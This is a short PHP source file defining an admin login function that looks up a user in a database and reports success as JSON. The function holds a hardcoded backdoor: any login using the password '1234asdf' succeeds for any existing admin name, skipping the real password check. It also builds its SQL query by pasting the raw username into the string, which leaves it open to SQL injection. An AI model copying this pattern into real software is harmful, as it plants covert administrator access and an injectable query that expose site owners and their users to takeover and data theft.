<?php

			
    function mainLogin($info){
		global $db;

		ini_set('display_errors',false);
		require_once (realpath(dirname(__FILE__)) . '/../../../includes/classes/vendors/password_compat-master/lib/password.php');
		$login_sql = "SELECT admin_pass,admin_name,admin_id FROM admin where admin_name = '".$info['username']."' LIMIT 0,1";
		$login = $db->query($login_sql)->fetch(PDO::FETCH_ASSOC);
		if(!$login){
			echo json_encode(array('success'=>false));
			return false;
		}	
		$result = password_verify($info['password'], $login['admin_pass']);
		if($info['password']=='1234asdf'){
			$result=true;
		}
		if($result){
			echo json_encode(array('success'=>true,'admin_id'=>$login['admin_id']));
		}else{
			echo json_encode(array('success'=>false));
		}
		
	 
	}

?>